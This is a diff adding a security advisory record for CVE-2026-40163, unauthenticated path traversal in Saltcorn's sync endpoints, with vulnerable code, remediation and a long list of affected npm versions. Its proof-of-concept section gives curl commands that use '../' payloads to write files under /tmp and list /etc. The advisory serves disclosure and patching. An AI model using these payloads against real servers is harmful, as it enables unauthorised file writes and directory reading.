@@ -1,0 +1,759 @@
+advisory_id: GHSA-32pv-mpqg-h292
+datasource_id: github_osv/GHSA-32pv-mpqg-h292
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-32pv-mpqg-h292/GHSA-32pv-mpqg-h292.json
+aliases:
+  - CVE-2026-40163
+summary: |
+  Saltcorn has an Unauthenticated Path Traversal in sync endpoints, allowing arbitrary file write and directory read
+  ### Summary
+
+  Two unauthenticated path traversal vulnerabilities exist in Saltcorn's mobile sync endpoints. The `POST /sync/offline_changes` endpoint allows an unauthenticated attacker to create arbitrary directories and write a `changes.json` file with attacker-controlled JSON content anywhere on the server filesystem. The `GET /sync/upload_finished` endpoint allows an unauthenticated attacker to list arbitrary directory contents and read specific JSON files.
+
+  The safe path validation function `File.normalise_in_base()` exists in the codebase and is correctly used by the `clean_sync_dir` endpoint in the **same file** (fix for GHSA-43f3-h63w-p6f6), but was not applied to these two endpoints.
+
+  ### Details
+
+  **Finding 1: Arbitrary file write — `POST /sync/offline_changes` (sync.js line 226)**
+
+  The `newSyncTimestamp` parameter from the request body is used directly in `path.join()` without sanitization:
+
+  ```javascript
+  const syncDirName = `${newSyncTimestamp}_${req.user?.email || "public"}`;
+  const syncDir = path.join(
+      rootFolder.location, "mobile_app", "sync", syncDirName
+  );
+  await fs.mkdir(syncDir, { recursive: true });        // creates arbitrary dir
+  await fs.writeFile(
+      path.join(syncDir, "changes.json"),
+      JSON.stringify(changes)                           // writes attacker content
+  );
+  ```
+
+  No authentication middleware is applied to this route. Since `path.join()` normalizes `../` sequences, setting `newSyncTimestamp` to `../../../../tmp/evil` causes the path to resolve outside the sync directory.
+
+  **Finding 2: Arbitrary directory read — `GET /sync/upload_finished` (sync.js line 288)**
+
+  The `dir_name` query parameter is used directly in `path.join()` without sanitization:
+
+  ```javascript
+  const syncDir = path.join(
+      rootFolder.location, "mobile_app", "sync", dir_name
+  );
+  let entries = await fs.readdir(syncDir);
+  ```
+
+  Also unauthenticated. An attacker can list directory contents and read files named `translated-ids.json`, `unique-conflicts.json`, `data-conflicts.json`, or `error.json` from any directory.
+
+  **Contrast — fixed endpoint in the same file (line 342):**
+
+  The `clean_sync_dir` endpoint correctly uses `File.normalise_in_base()`:
+
+  ```javascript
+  const syncDir = File.normalise_in_base(
+      path.join(rootFolder.location, "mobile_app", "sync"),
+      dir_name
+  );
+  if (syncDir) await fs.rm(syncDir, { recursive: true, force: true });
+  ```
+
+  ### PoC
+
+  ```bash
+  # Write arbitrary file to /tmp/
+  curl -X POST http://TARGET:3000/sync/offline_changes \
+    -H "Content-Type: application/json" \
+    -d '{
+      "newSyncTimestamp": "../../../../tmp/saltcorn_poc",
+      "oldSyncTimestamp": "0",
+      "changes": {"proof": "path_traversal_write"}
+    }'
+  # Result: /tmp/saltcorn_poc_public/changes.json created with attacker content
+
+  # List /etc/ directory
+  curl "http://TARGET:3000/sync/upload_finished?dir_name=../../../../etc"
+  ```
+
+  ### Impact
+
+  - **Unauthenticated arbitrary directory creation** anywhere on the filesystem
+  - **Unauthenticated arbitrary JSON file write** (`changes.json`) to any writable directory
+  - **Unauthenticated directory listing** of arbitrary directories
+  - **Unauthenticated read** of specific JSON files from arbitrary directories
+  - Potential for **remote code execution** via writing to sensitive paths (cron, systemd, Node.js module paths)
+
+  ### Remediation
+
+  Apply `File.normalise_in_base()` to both endpoints, matching the existing pattern in `clean_sync_dir`:
+
+  ```javascript
+  // offline_changes fix
+  const syncDirName = `${newSyncTimestamp}_${req.user?.email || "public"}`;
+  const syncDir = File.normalise_in_base(
+      path.join(rootFolder.location, "mobile_app", "sync"),
+      syncDirName
+  );
+  if (!syncDir) {
+      return res.status(400).json({ error: "Invalid sync directory name" });
+  }
+
+  // upload_finished fix
+  const syncDir = File.normalise_in_base(
+      path.join(rootFolder.location, "mobile_app", "sync"),
+      dir_name
+  );
+  if (!syncDir) {
+      return res.json({ finished: false });
+  }
+  ```
+
+  Additionally, add `loggedIn` middleware to endpoints that modify server state.
+impacted_packages:
+  - purl: pkg:npm/%40saltcorn/server
+    affected_versions: vers:npm/<1.4.5
+    fixed_versions: vers:npm/1.4.5
+    affected_packages:
+      - pkg:npm/%40saltcorn/server@0.0.2
+      - pkg:npm/%40saltcorn/server@0.0.3
+      - pkg:npm/%40saltcorn/server@0.0.4
+      - pkg:npm/%40saltcorn/server@0.0.5
+      - pkg:npm/%40saltcorn/server@0.0.6
+      - pkg:npm/%40saltcorn/server@0.0.7
+      - pkg:npm/%40saltcorn/server@0.0.8
+      - pkg:npm/%40saltcorn/server@0.0.9
+      - pkg:npm/%40saltcorn/server@0.1.0
+      - pkg:npm/%40saltcorn/server@0.1.1
+      - pkg:npm/%40saltcorn/server@0.1.2
+      - pkg:npm/%40saltcorn/server@0.1.3
+      - pkg:npm/%40saltcorn/server@0.1.4
+      - pkg:npm/%40saltcorn/server@0.2.0-rc.0
+      - pkg:npm/%40saltcorn/server@0.2.0-rc.1
+      - pkg:npm/%40saltcorn/server@0.2.0
+      - pkg:npm/%40saltcorn/server@0.2.1-beta.0
+      - pkg:npm/%40saltcorn/server@0.2.1-beta.1
+      - pkg:npm/%40saltcorn/server@0.2.1-beta.2
+      - pkg:npm/%40saltcorn/server@0.2.1
+      - pkg:npm/%40saltcorn/server@0.2.2-beta.0
+      - pkg:npm/%40saltcorn/server@0.2.2
+      - pkg:npm/%40saltcorn/server@0.2.3-beta.0
+      - pkg:npm/%40saltcorn/server@0.2.3-beta.1
+      - pkg:npm/%40saltcorn/server@0.2.3-beta.2
+      - pkg:npm/%40saltcorn/server@0.2.3
+      - pkg:npm/%40saltcorn/server@0.3.0-beta.0
+      - pkg:npm/%40saltcorn/server@0.3.0-beta.1
+      - pkg:npm/%40saltcorn/server@0.3.0-beta.2
+      - pkg:npm/%40saltcorn/server@0.3.0
+      - pkg:npm/%40saltcorn/server@0.3.1-beta.0
+      - pkg:npm/%40saltcorn/server@0.3.1-beta.1
+      - pkg:npm/%40saltcorn/server@0.3.1
+      - pkg:npm/%40saltcorn/server@0.3.2-beta.0
+      - pkg:npm/%40saltcorn/server@0.3.2-beta.1
+      - pkg:npm/%40saltcorn/server@0.3.2-beta.2
+      - pkg:npm/%40saltcorn/server@0.3.2
+      - pkg:npm/%40saltcorn/server@0.3.3
+      - pkg:npm/%40saltcorn/server@0.3.4-beta.0
+      - pkg:npm/%40saltcorn/server@0.3.4-beta.1
+      - pkg:npm/%40saltcorn/server@0.3.4
+      - pkg:npm/%40saltcorn/server@0.3.5-beta.0
+      - pkg:npm/%40saltcorn/server@0.3.5
+      - pkg:npm/%40saltcorn/server@0.4.0-beta.0
+      - pkg:npm/%40saltcorn/server@0.4.0-beta.1
+      - pkg:npm/%40saltcorn/server@0.4.0
+      - pkg:npm/%40saltcorn/server@0.4.1-beta.0
+      - pkg:npm/%40saltcorn/server@0.4.1
+      - pkg:npm/%40saltcorn/server@0.4.2-0.4.2-beta.0.0
+      - pkg:npm/%40saltcorn/server@0.4.2-beta.0
+      - pkg:npm/%40saltcorn/server@0.4.2
+      - pkg:npm/%40saltcorn/server@0.4.3-beta.0
+      - pkg:npm/%40saltcorn/server@0.4.3-beta.1
+      - pkg:npm/%40saltcorn/server@0.4.3-beta.2
+      - pkg:npm/%40saltcorn/server@0.4.3
+      - pkg:npm/%40saltcorn/server@0.4.4-beta.0
+      - pkg:npm/%40saltcorn/server@0.4.4-beta.1
+      - pkg:npm/%40saltcorn/server@0.4.4-beta.2
+      - pkg:npm/%40saltcorn/server@0.4.4-beta.3
+      - pkg:npm/%40saltcorn/server@0.4.4-beta.4
+      - pkg:npm/%40saltcorn/server@0.4.4-beta.5
+      - pkg:npm/%40saltcorn/server@0.4.4
+      - pkg:npm/%40saltcorn/server@0.4.5-beta.0
+      - pkg:npm/%40saltcorn/server@0.4.5-beta.1
+      - pkg:npm/%40saltcorn/server@0.4.5
+      - pkg:npm/%40saltcorn/server@0.5.0-alpha.0
+      - pkg:npm/%40saltcorn/server@0.5.0-beta.0
+      - pkg:npm/%40saltcorn/server@0.5.0-beta.1
+      - pkg:npm/%40saltcorn/server@0.5.0
+      - pkg:npm/%40saltcorn/server@0.5.1-alpha.0
+      - pkg:npm/%40saltcorn/server@0.5.1-alpha.2
+      - pkg:npm/%40saltcorn/server@0.5.1-alpha.3
+      - pkg:npm/%40saltcorn/server@0.5.1-beta.0
+      - pkg:npm/%40saltcorn/server@0.5.1-beta.1
+      - pkg:npm/%40saltcorn/server@0.5.1
+      - pkg:npm/%40saltcorn/server@0.5.2-beta.0
+      - pkg:npm/%40saltcorn/server@0.5.2-beta.1
+      - pkg:npm/%40saltcorn/server@0.5.2
+      - pkg:npm/%40saltcorn/server@0.5.3-alpha.0
+      - pkg:npm/%40saltcorn/server@0.5.3-alpha.1
+      - pkg:npm/%40saltcorn/server@0.5.3-alpha.2
+      - pkg:npm/%40saltcorn/server@0.5.3-beta.0
+      - pkg:npm/%40saltcorn/server@0.5.3-beta.1
+      - pkg:npm/%40saltcorn/server@0.5.3
+      - pkg:npm/%40saltcorn/server@0.5.4-beta.0
+      - pkg:npm/%40saltcorn/server@0.5.4-beta.1
+      - pkg:npm/%40saltcorn/server@0.5.4
+      - pkg:npm/%40saltcorn/server@0.5.5-beta.0
+      - pkg:npm/%40saltcorn/server@0.5.5-beta.1
+      - pkg:npm/%40saltcorn/server@0.5.5
+      - pkg:npm/%40saltcorn/server@0.5.6-beta.0
+      - pkg:npm/%40saltcorn/server@0.5.6-beta.1
+      - pkg:npm/%40saltcorn/server@0.5.6-beta.2
+      - pkg:npm/%40saltcorn/server@0.5.6-beta.3
+      - pkg:npm/%40saltcorn/server@0.5.6-rc.0
+      - pkg:npm/%40saltcorn/server@0.5.6
+      - pkg:npm/%40saltcorn/server@0.6.0-alpha.0
+      - pkg:npm/%40saltcorn/server@0.6.0-beta.0
+      - pkg:npm/%40saltcorn/server@0.6.0-beta.1
+      - pkg:npm/%40saltcorn/server@0.6.0-beta.2
+      - pkg:npm/%40saltcorn/server@0.6.0-beta.3
+      - pkg:npm/%40saltcorn/server@0.6.0-beta.4
+      - pkg:npm/%40saltcorn/server@0.6.0
+      - pkg:npm/%40saltcorn/server@0.6.1-beta.0
+      - pkg:npm/%40saltcorn/server@0.6.1-beta.1
+      - pkg:npm/%40saltcorn/server@0.6.1-beta.2
+      - pkg:npm/%40saltcorn/server@0.6.1-beta.3
+      - pkg:npm/%40saltcorn/server@0.6.1
+      - pkg:npm/%40saltcorn/server@0.6.2-beta.0
+      - pkg:npm/%40saltcorn/server@0.6.2-beta.1
+      - pkg:npm/%40saltcorn/server@0.6.2-beta.2
+      - pkg:npm/%40saltcorn/server@0.6.2-beta.3
+      - pkg:npm/%40saltcorn/server@0.6.2-beta.4
+      - pkg:npm/%40saltcorn/server@0.6.2-beta.5
+      - pkg:npm/%40saltcorn/server@0.6.2
+      - pkg:npm/%40saltcorn/server@0.6.3-beta.0
+      - pkg:npm/%40saltcorn/server@0.6.3-beta.1
+      - pkg:npm/%40saltcorn/server@0.6.3-beta.2
+      - pkg:npm/%40saltcorn/server@0.6.3-beta.3
+      - pkg:npm/%40saltcorn/server@0.6.3
+      - pkg:npm/%40saltcorn/server@0.6.4-beta.1
+      - pkg:npm/%40saltcorn/server@0.6.4-beta.2
+      - pkg:npm/%40saltcorn/server@0.6.4-beta.3
+      - pkg:npm/%40saltcorn/server@0.6.4-beta.4
+      - pkg:npm/%40saltcorn/server@0.6.4-beta.5
+      - pkg:npm/%40saltcorn/server@0.6.4-beta.6
+      - pkg:npm/%40saltcorn/server@0.6.4
+      - pkg:npm/%40saltcorn/server@0.7.0-beta.0
+      - pkg:npm/%40saltcorn/server@0.7.0-beta.1
+      - pkg:npm/%40saltcorn/server@0.7.0-beta.2
+      - pkg:npm/%40saltcorn/server@0.7.0-beta.3
+      - pkg:npm/%40saltcorn/server@0.7.0-beta.4
+      - pkg:npm/%40saltcorn/server@0.7.0-beta.5
+      - pkg:npm/%40saltcorn/server@0.7.0
+      - pkg:npm/%40saltcorn/server@0.7.1-beta.0
+      - pkg:npm/%40saltcorn/server@0.7.1-beta.1
+      - pkg:npm/%40saltcorn/server@0.7.1-beta.2
+      - pkg:npm/%40saltcorn/server@0.7.1-beta.3
+      - pkg:npm/%40saltcorn/server@0.7.1
+      - pkg:npm/%40saltcorn/server@0.7.2-beta.0
+      - pkg:npm/%40saltcorn/server@0.7.2-beta.2
+      - pkg:npm/%40saltcorn/server@0.7.2-beta.3
+      - pkg:npm/%40saltcorn/server@0.7.2-beta.4
+      - pkg:npm/%40saltcorn/server@0.7.2-beta.5
+      - pkg:npm/%40saltcorn/server@0.7.2-beta.6
+      - pkg:npm/%40saltcorn/server@0.7.2-beta.7
+      - pkg:npm/%40saltcorn/server@0.7.2-beta.8
+      - pkg:npm/%40saltcorn/server@0.7.2-beta.9
+      - pkg:npm/%40saltcorn/server@0.7.2-beta.10
+      - pkg:npm/%40saltcorn/server@0.7.2
+      - pkg:npm/%40saltcorn/server@0.7.3-beta.0
+      - pkg:npm/%40saltcorn/server@0.7.3-beta.1
+      - pkg:npm/%40saltcorn/server@0.7.3-beta.2
+      - pkg:npm/%40saltcorn/server@0.7.3-beta.3
+      - pkg:npm/%40saltcorn/server@0.7.3-beta.6
+      - pkg:npm/%40saltcorn/server@0.7.3-beta.7
+      - pkg:npm/%40saltcorn/server@0.7.3
+      - pkg:npm/%40saltcorn/server@0.7.4-beta.0
+      - pkg:npm/%40saltcorn/server@0.7.4-beta.1
+      - pkg:npm/%40saltcorn/server@0.7.4-beta.2
+      - pkg:npm/%40saltcorn/server@0.7.4-beta.3
+      - pkg:npm/%40saltcorn/server@0.7.4
+      - pkg:npm/%40saltcorn/server@0.8.0-beta.0
+      - pkg:npm/%40saltcorn/server@0.8.0-beta.1
+      - pkg:npm/%40saltcorn/server@0.8.0-beta.2
+      - pkg:npm/%40saltcorn/server@0.8.0-beta.3
+      - pkg:npm/%40saltcorn/server@0.8.0-beta.4
+      - pkg:npm/%40saltcorn/server@0.8.0
+      - pkg:npm/%40saltcorn/server@0.8.1-beta.0
+      - pkg:npm/%40saltcorn/server@0.8.1-beta.1
+      - pkg:npm/%40saltcorn/server@0.8.1-beta.2
+      - pkg:npm/%40saltcorn/server@0.8.1-beta.3
+      - pkg:npm/%40saltcorn/server@0.8.1-beta.4
+      - pkg:npm/%40saltcorn/server@0.8.1-beta.5
+      - pkg:npm/%40saltcorn/server@0.8.1-rc.2
+      - pkg:npm/%40saltcorn/server@0.8.1-rc.3
+      - pkg:npm/%40saltcorn/server@0.8.1
+      - pkg:npm/%40saltcorn/server@0.8.2-beta.0
+      - pkg:npm/%40saltcorn/server@0.8.2
+      - pkg:npm/%40saltcorn/server@0.8.3-alpha.0
+      - pkg:npm/%40saltcorn/server@0.8.3-alpha.1
+      - pkg:npm/%40saltcorn/server@0.8.3-alpha.2
+      - pkg:npm/%40saltcorn/server@0.8.3-beta.0
+      - pkg:npm/%40saltcorn/server@0.8.3-beta.1
+      - pkg:npm/%40saltcorn/server@0.8.3-beta.2
+      - pkg:npm/%40saltcorn/server@0.8.3-beta.3
+      - pkg:npm/%40saltcorn/server@0.8.3
+      - pkg:npm/%40saltcorn/server@0.8.4
+      - pkg:npm/%40saltcorn/server@0.8.5-beta.0
+      - pkg:npm/%40saltcorn/server@0.8.5-beta.1
+      - pkg:npm/%40saltcorn/server@0.8.5-beta.2
+      - pkg:npm/%40saltcorn/server@0.8.5-beta.3
+      - pkg:npm/%40saltcorn/server@0.8.5-beta.4
+      - pkg:npm/%40saltcorn/server@0.8.5-beta.5
+      - pkg:npm/%40saltcorn/server@0.8.5-beta.6
+      - pkg:npm/%40saltcorn/server@0.8.5-beta.7
+      - pkg:npm/%40saltcorn/server@0.8.5-beta.8
+      - pkg:npm/%40saltcorn/server@0.8.5-rc.1
+      - pkg:npm/%40saltcorn/server@0.8.5-rc.2
+      - pkg:npm/%40saltcorn/server@0.8.5
+      - pkg:npm/%40saltcorn/server@0.8.6-beta.1
+      - pkg:npm/%40saltcorn/server@0.8.6-beta.2
+      - pkg:npm/%40saltcorn/server@0.8.6-beta.3
+      - pkg:npm/%40saltcorn/server@0.8.6-beta.4
+      - pkg:npm/%40saltcorn/server@0.8.6-beta.5
+      - pkg:npm/%40saltcorn/server@0.8.6-beta.6
+      - pkg:npm/%40saltcorn/server@0.8.6-beta.7
+      - pkg:npm/%40saltcorn/server@0.8.6-beta.8
+      - pkg:npm/%40saltcorn/server@0.8.6-beta.9
+      - pkg:npm/%40saltcorn/server@0.8.6-beta.10
+      - pkg:npm/%40saltcorn/server@0.8.6-beta.11
+      - pkg:npm/%40saltcorn/server@0.8.6-beta.12
+      - pkg:npm/%40saltcorn/server@0.8.6-beta.13
+      - pkg:npm/%40saltcorn/server@0.8.6-beta.14
+      - pkg:npm/%40saltcorn/server@0.8.6-beta.15
+      - pkg:npm/%40saltcorn/server@0.8.6-beta.16
+      - pkg:npm/%40saltcorn/server@0.8.6-beta.17
+      - pkg:npm/%40saltcorn/server@0.8.6-beta.18
+      - pkg:npm/%40saltcorn/server@0.8.6-beta.19
+      - pkg:npm/%40saltcorn/server@0.8.6
+      - pkg:npm/%40saltcorn/server@0.8.7-beta.0
+      - pkg:npm/%40saltcorn/server@0.8.7-beta.1
+      - pkg:npm/%40saltcorn/server@0.8.7-beta.2
+      - pkg:npm/%40saltcorn/server@0.8.7-beta.3
+      - pkg:npm/%40saltcorn/server@0.8.7-beta.4
+      - pkg:npm/%40saltcorn/server@0.8.7-beta.5
+      - pkg:npm/%40saltcorn/server@0.8.7-beta.6
+      - pkg:npm/%40saltcorn/server@0.8.7
+      - pkg:npm/%40saltcorn/server@0.8.8-beta.0
+      - pkg:npm/%40saltcorn/server@0.8.8-beta.1
+      - pkg:npm/%40saltcorn/server@0.8.8-beta.2
+      - pkg:npm/%40saltcorn/server@0.8.8-beta.3
+      - pkg:npm/%40saltcorn/server@0.8.8-beta.4
+      - pkg:npm/%40saltcorn/server@0.8.8-beta.5
+      - pkg:npm/%40saltcorn/server@0.8.8-beta.6
+      - pkg:npm/%40saltcorn/server@0.8.8-beta.7
+      - pkg:npm/%40saltcorn/server@0.8.9
+      - pkg:npm/%40saltcorn/server@0.9.0-beta.0
+      - pkg:npm/%40saltcorn/server@0.9.0-beta.1
+      - pkg:npm/%40saltcorn/server@0.9.0-beta.2
+      - pkg:npm/%40saltcorn/server@0.9.0-beta.3
+      - pkg:npm/%40saltcorn/server@0.9.0-beta.4
+      - pkg:npm/%40saltcorn/server@0.9.0-beta.5
+      - pkg:npm/%40saltcorn/server@0.9.0-beta.6
+      - pkg:npm/%40saltcorn/server@0.9.0-beta.7
+      - pkg:npm/%40saltcorn/server@0.9.0-beta.8
+      - pkg:npm/%40saltcorn/server@0.9.0-beta.9
+      - pkg:npm/%40saltcorn/server@0.9.0-beta.10
+      - pkg:npm/%40saltcorn/server@0.9.0-beta.11
+      - pkg:npm/%40saltcorn/server@0.9.0
+      - pkg:npm/%40saltcorn/server@0.9.1-beta.0
+      - pkg:npm/%40saltcorn/server@0.9.1-beta.1
+      - pkg:npm/%40saltcorn/server@0.9.1-beta.2
+      - pkg:npm/%40saltcorn/server@0.9.1-beta.3
+      - pkg:npm/%40saltcorn/server@0.9.1-beta.4
+      - pkg:npm/%40saltcorn/server@0.9.1-beta.5
+      - pkg:npm/%40saltcorn/server@0.9.1-beta.6
+      - pkg:npm/%40saltcorn/server@0.9.1-beta.7
+      - pkg:npm/%40saltcorn/server@0.9.1-beta.8
+      - pkg:npm/%40saltcorn/server@0.9.1-beta.9
+      - pkg:npm/%40saltcorn/server@0.9.1-beta.10
+      - pkg:npm/%40saltcorn/server@0.9.1-beta.11
+      - pkg:npm/%40saltcorn/server@0.9.1-beta.12
+      - pkg:npm/%40saltcorn/server@0.9.1-beta.13
+      - pkg:npm/%40saltcorn/server@0.9.1-beta.14
+      - pkg:npm/%40saltcorn/server@0.9.1-beta.15
+      - pkg:npm/%40saltcorn/server@0.9.1-beta.16
+      - pkg:npm/%40saltcorn/server@0.9.1-beta.17
+      - pkg:npm/%40saltcorn/server@0.9.1-beta.18
+      - pkg:npm/%40saltcorn/server@0.9.1-beta.19
+      - pkg:npm/%40saltcorn/server@0.9.1
+      - pkg:npm/%40saltcorn/server@0.9.2-rc.1
+      - pkg:npm/%40saltcorn/server@0.9.2
+      - pkg:npm/%40saltcorn/server@0.9.3-beta.0
+      - pkg:npm/%40saltcorn/server@0.9.3-beta.1
+      - pkg:npm/%40saltcorn/server@0.9.3-beta.2
+      - pkg:npm/%40saltcorn/server@0.9.3-beta.3
+      - pkg:npm/%40saltcorn/server@0.9.3-beta.4
+      - pkg:npm/%40saltcorn/server@0.9.3-beta.5
+      - pkg:npm/%40saltcorn/server@0.9.3-beta.6
+      - pkg:npm/%40saltcorn/server@0.9.3-beta.7
+      - pkg:npm/%40saltcorn/server@0.9.3-beta.8
+      - pkg:npm/%40saltcorn/server@0.9.3-rc.1
+      - pkg:npm/%40saltcorn/server@0.9.3
+      - pkg:npm/%40saltcorn/server@0.9.4-beta.0
+      - pkg:npm/%40saltcorn/server@0.9.4-beta.1
+      - pkg:npm/%40saltcorn/server@0.9.4-beta.2
+      - pkg:npm/%40saltcorn/server@0.9.4-beta.3
+      - pkg:npm/%40saltcorn/server@0.9.4-beta.4
+      - pkg:npm/%40saltcorn/server@0.9.4-beta.5
+      - pkg:npm/%40saltcorn/server@0.9.4-beta.6
+      - pkg:npm/%40saltcorn/server@0.9.4-beta.7
+      - pkg:npm/%40saltcorn/server@0.9.4-beta.8
+      - pkg:npm/%40saltcorn/server@0.9.4-beta.9
+      - pkg:npm/%40saltcorn/server@0.9.4-beta.10
+      - pkg:npm/%40saltcorn/server@0.9.4-beta.11
+      - pkg:npm/%40saltcorn/server@0.9.4-beta.12
+      - pkg:npm/%40saltcorn/server@0.9.4-beta.13
+      - pkg:npm/%40saltcorn/server@0.9.4-beta.14
+      - pkg:npm/%40saltcorn/server@0.9.4-beta.15
+      - pkg:npm/%40saltcorn/server@0.9.4-beta.16
+      - pkg:npm/%40saltcorn/server@0.9.4-beta.17
+      - pkg:npm/%40saltcorn/server@0.9.4-beta.18
+      - pkg:npm/%40saltcorn/server@0.9.4-beta.19
+      - pkg:npm/%40saltcorn/server@0.9.4-beta.20
+      - pkg:npm/%40saltcorn/server@0.9.4-beta.21
+      - pkg:npm/%40saltcorn/server@0.9.4-beta.22
+      - pkg:npm/%40saltcorn/server@0.9.4-beta.23
+      - pkg:npm/%40saltcorn/server@0.9.4
+      - pkg:npm/%40saltcorn/server@0.9.5-beta.0
+      - pkg:npm/%40saltcorn/server@0.9.5-beta.1
+      - pkg:npm/%40saltcorn/server@0.9.5-beta.2
+      - pkg:npm/%40saltcorn/server@0.9.5-beta.3
+      - pkg:npm/%40saltcorn/server@0.9.5-beta.4
+      - pkg:npm/%40saltcorn/server@0.9.5-beta.5
+      - pkg:npm/%40saltcorn/server@0.9.5-beta.6
+      - pkg:npm/%40saltcorn/server@0.9.5-beta.7
+      - pkg:npm/%40saltcorn/server@0.9.5-beta.8
+      - pkg:npm/%40saltcorn/server@0.9.5-beta.9
+      - pkg:npm/%40saltcorn/server@0.9.5-beta.10
+      - pkg:npm/%40saltcorn/server@0.9.5-beta.11
+      - pkg:npm/%40saltcorn/server@0.9.5-beta.12
+      - pkg:npm/%40saltcorn/server@0.9.5-beta.13
+      - pkg:npm/%40saltcorn/server@0.9.5-beta.14
+      - pkg:npm/%40saltcorn/server@0.9.5-beta.15
+      - pkg:npm/%40saltcorn/server@0.9.5-beta.16
+      - pkg:npm/%40saltcorn/server@0.9.5-beta.17
+      - pkg:npm/%40saltcorn/server@0.9.5-beta.18
+      - pkg:npm/%40saltcorn/server@0.9.5-beta.19
+      - pkg:npm/%40saltcorn/server@0.9.5-beta.20
+      - pkg:npm/%40saltcorn/server@0.9.5-beta.21
+      - pkg:npm/%40saltcorn/server@0.9.5-beta.22
+      - pkg:npm/%40saltcorn/server@0.9.5-beta.23
+      - pkg:npm/%40saltcorn/server@0.9.5-beta.24
+      - pkg:npm/%40saltcorn/server@0.9.5-beta.25
+      - pkg:npm/%40saltcorn/server@0.9.5-beta.26
+      - pkg:npm/%40saltcorn/server@0.9.5-beta.27
+      - pkg:npm/%40saltcorn/server@0.9.5-beta.28
+      - pkg:npm/%40saltcorn/server@0.9.5
+      - pkg:npm/%40saltcorn/server@0.9.6-beta.0
+      - pkg:npm/%40saltcorn/server@0.9.6-beta.1
+      - pkg:npm/%40saltcorn/server@0.9.6-beta.2
+      - pkg:npm/%40saltcorn/server@0.9.6-beta.3
+      - pkg:npm/%40saltcorn/server@0.9.6-beta.4
+      - pkg:npm/%40saltcorn/server@0.9.6-beta.5
+      - pkg:npm/%40saltcorn/server@0.9.6-beta.6
+      - pkg:npm/%40saltcorn/server@0.9.6-beta.7
+      - pkg:npm/%40saltcorn/server@0.9.6-beta.8
+      - pkg:npm/%40saltcorn/server@0.9.6-beta.9
+      - pkg:npm/%40saltcorn/server@0.9.6-beta.10
+      - pkg:npm/%40saltcorn/server@0.9.6-beta.11
+      - pkg:npm/%40saltcorn/server@0.9.6-beta.12
+      - pkg:npm/%40saltcorn/server@0.9.6-beta.13
+      - pkg:npm/%40saltcorn/server@0.9.6-beta.14
+      - pkg:npm/%40saltcorn/server@0.9.6-beta.15
+      - pkg:npm/%40saltcorn/server@0.9.6-beta.16
+      - pkg:npm/%40saltcorn/server@0.9.6-beta.17
+      - pkg:npm/%40saltcorn/server@0.9.6-beta.18
+      - pkg:npm/%40saltcorn/server@0.9.6-beta.19
+      - pkg:npm/%40saltcorn/server@0.9.6-beta.20
+      - pkg:npm/%40saltcorn/server@0.9.6
+      - pkg:npm/%40saltcorn/server@0.9.7-rc.0
+      - pkg:npm/%40saltcorn/server@0.9.7
+      - pkg:npm/%40saltcorn/server@0.9.8-rc.0
+      - pkg:npm/%40saltcorn/server@0.9.8
+      - pkg:npm/%40saltcorn/server@1.0.0-beta.0
+      - pkg:npm/%40saltcorn/server@1.0.0-beta.1
+      - pkg:npm/%40saltcorn/server@1.0.0-beta.2
+      - pkg:npm/%40saltcorn/server@1.0.0-beta.3
+      - pkg:npm/%40saltcorn/server@1.0.0-beta.4
+      - pkg:npm/%40saltcorn/server@1.0.0-beta.5
+      - pkg:npm/%40saltcorn/server@1.0.0-beta.6
+      - pkg:npm/%40saltcorn/server@1.0.0-beta.7
+      - pkg:npm/%40saltcorn/server@1.0.0-beta.8
+      - pkg:npm/%40saltcorn/server@1.0.0-beta.9
+      - pkg:npm/%40saltcorn/server@1.0.0-beta.10
+      - pkg:npm/%40saltcorn/server@1.0.0-beta.11
+      - pkg:npm/%40saltcorn/server@1.0.0-beta.13
+      - pkg:npm/%40saltcorn/server@1.0.0-beta.14
+      - pkg:npm/%40saltcorn/server@1.0.0-beta.15
+      - pkg:npm/%40saltcorn/server@1.0.0-beta.16
+      - pkg:npm/%40saltcorn/server@1.0.0-beta.17
+      - pkg:npm/%40saltcorn/server@1.0.0-beta.18
+      - pkg:npm/%40saltcorn/server@1.0.0-beta.19
+      - pkg:npm/%40saltcorn/server@1.0.0-rc.1
+      - pkg:npm/%40saltcorn/server@1.0.0-rc.2
+      - pkg:npm/%40saltcorn/server@1.0.0-rc.3
+      - pkg:npm/%40saltcorn/server@1.0.0-rc.5
+      - pkg:npm/%40saltcorn/server@1.0.0-rc.6
+      - pkg:npm/%40saltcorn/server@1.0.0-rc.7
+      - pkg:npm/%40saltcorn/server@1.0.0-rc.8
+      - pkg:npm/%40saltcorn/server@1.0.0-rc.9
+      - pkg:npm/%40saltcorn/server@1.0.0-rc.10
+      - pkg:npm/%40saltcorn/server@1.0.0
+      - pkg:npm/%40saltcorn/server@1.1.0-beta.0
+      - pkg:npm/%40saltcorn/server@1.1.0-beta.1
+      - pkg:npm/%40saltcorn/server@1.1.0-beta.2
+      - pkg:npm/%40saltcorn/server@1.1.0-beta.3
+      - pkg:npm/%40saltcorn/server@1.1.0-beta.4
+      - pkg:npm/%40saltcorn/server@1.1.0-beta.5
+      - pkg:npm/%40saltcorn/server@1.1.0-beta.6
+      - pkg:npm/%40saltcorn/server@1.1.0-beta.7
+      - pkg:npm/%40saltcorn/server@1.1.0-beta.8
+      - pkg:npm/%40saltcorn/server@1.1.0-beta.9
+      - pkg:npm/%40saltcorn/server@1.1.0-beta.10
+      - pkg:npm/%40saltcorn/server@1.1.0-beta.11
+      - pkg:npm/%40saltcorn/server@1.1.0-beta.12
+      - pkg:npm/%40saltcorn/server@1.1.0-beta.13
+      - pkg:npm/%40saltcorn/server@1.1.0-beta.14
+      - pkg:npm/%40saltcorn/server@1.1.0-beta.15
+      - pkg:npm/%40saltcorn/server@1.1.0-beta.16
+      - pkg:npm/%40saltcorn/server@1.1.0-beta.17
+      - pkg:npm/%40saltcorn/server@1.1.0-beta.18
+      - pkg:npm/%40saltcorn/server@1.1.0-beta.19
+      - pkg:npm/%40saltcorn/server@1.1.0-beta.20
+      - pkg:npm/%40saltcorn/server@1.1.0-beta.21
+      - pkg:npm/%40saltcorn/server@1.1.0-beta.22
+      - pkg:npm/%40saltcorn/server@1.1.0-beta.23
+      - pkg:npm/%40saltcorn/server@1.1.0-beta.25
+      - pkg:npm/%40saltcorn/server@1.1.0
+      - pkg:npm/%40saltcorn/server@1.1.1-beta.0
+      - pkg:npm/%40saltcorn/server@1.1.1-beta.1
+      - pkg:npm/%40saltcorn/server@1.1.1-beta.2
+      - pkg:npm/%40saltcorn/server@1.1.1-beta.3
+      - pkg:npm/%40saltcorn/server@1.1.1-beta.4
